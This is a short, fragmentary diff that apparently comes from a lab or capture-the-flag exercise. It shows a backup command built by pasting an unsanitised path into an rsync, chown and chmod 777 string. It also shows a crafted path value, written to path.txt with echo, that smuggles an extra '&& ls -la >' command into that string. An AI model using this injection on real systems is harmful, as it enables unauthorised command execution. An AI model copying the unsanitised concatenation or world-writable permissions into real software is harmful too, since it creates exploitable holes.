@@ -1,0 +1,20 @@
+
+
+
+
+
+
+
+
+
+
+
+cmd = "rsync -a "+path+" /home/alice/backup --exclude back --exclude backup.py&& chown -R www-data:alice /home/alice/backup && chmod -R 777 /home/alice/backup"
+
+
+
+path = /tmp && ls -la > /home/alice/root.txt && rsync -a
+
+cmd = "rsync -a "+path+" /home/alice/backup --exclude back --exclude backup.py&& chown -R www-data:alice /home/alice/backup && chmod -R 777 /home/alice/backup"
+
+echo "/tmp && ls -la > /home/alice/root.txt && rsync -a " >> path.txt
